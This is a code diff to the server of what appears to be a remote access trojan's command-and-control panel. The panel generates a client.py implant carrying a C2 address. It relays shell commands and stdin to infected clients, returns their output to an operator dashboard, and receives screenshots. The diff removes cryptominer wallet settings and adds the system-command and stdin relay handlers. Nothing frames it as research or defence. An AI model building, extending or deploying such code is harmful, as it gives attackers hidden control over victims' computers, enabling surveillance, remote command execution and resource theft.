@@ -160,8 +160,6 @@ def payload():
 
     content = re.sub(r'(C2_ADDRESS\s*=\s*).*', f'C2_ADDRESS = "{config["url"]}"', content)
     content = re.sub(r'(TARGET_HEIGHT\s*=\s*).*', f'TARGET_HEIGHT = {config["resolution"]}', content)
-    content = re.sub(r'(DEFAULT_MINER_WALLET\s*=\s*).*', f'DEFAULT_MINER_WALLET = "{config.get("miner_wallet", "")}"', content)
-    content = re.sub(r'(DEFAULT_MINER_INTENSITY\s*=\s*).*', f'DEFAULT_MINER_INTENSITY = {config.get("miner_intensity", 50)}', content)
 
     return send_file(io.BytesIO(content.encode()), mimetype='text/x-python', as_attachment=True, download_name='client.py')
 
@@ -204,9 +202,23 @@ def handle_command(data):
     if session.get('logged_in'):
         socketio.emit('execute_command', data.get('command'), to=data.get('client_id'), namespace='/api')
 
+@socketio.on('system_command', namespace="/api")
+def handle_system_command(data):
+    if session.get('logged_in'):
+        socketio.emit('system_command', data.get('command'), to=data.get('client_id'), namespace='/api')
+
+@socketio.on('stdin', namespace="/api")
+def handle_stdin(data):
+    if session.get('logged_in'):
+        socketio.emit('stdin', data.get('command'), to=data.get('client_id'), namespace='/api')
+
 @socketio.on('command_output', namespace="/api")
 def handle_command_output(data):
     socketio.emit('command_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)
+
+@socketio.on('system_output', namespace="/api")
+def handle_system_output(data):
+    socketio.emit('system_output', {'output': data.get('output'), 'client_id': request.sid}, namespace='/api', to=DASHBOARD_ROOM)
 
 @socketio.on('screenshot', namespace="/api")
 def handle_screenshot(image_data=None):
